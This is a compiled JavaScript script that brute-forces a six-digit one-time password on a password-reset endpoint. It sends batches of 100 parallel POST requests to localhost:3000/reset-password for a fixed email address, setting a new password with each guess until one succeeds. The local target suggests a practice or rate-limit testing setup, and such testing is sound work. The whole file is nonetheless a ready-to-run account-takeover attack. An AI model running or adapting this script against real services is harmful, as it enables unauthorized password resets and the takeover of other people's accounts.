"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
const brutForce = ({ otp }) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        let data = JSON.stringify({
            "email": "test@gmail.com",
            "otp": otp,
            "newPassword": "newPassword"
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'http://localhost:3000/reset-password',
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };
        const response = yield axios_1.default.request(config);
        if (response.data.success) {
            return true;
        }
        return false;
    }
    catch (error) {
        return false;
    }
});
const attemptBruteForce = () => __awaiter(void 0, void 0, void 0, function* () {
    for (let i = 100000; i < 1000000; i++) {
        let p = [];
        for (let j = 0; j < 100; j++) {
            const otp = (i + j).toString();
            console.log("otp", otp);
            const result = brutForce({
                otp,
            });
            p.push(result);
        }
        const results = yield Promise.all(p);
        console.log("waited for 100 requests");
        if (results.includes(true)) {
            console.log("Successful OTP found, stopping brute force");
            break;
        }
    }
});
attemptBruteForce();
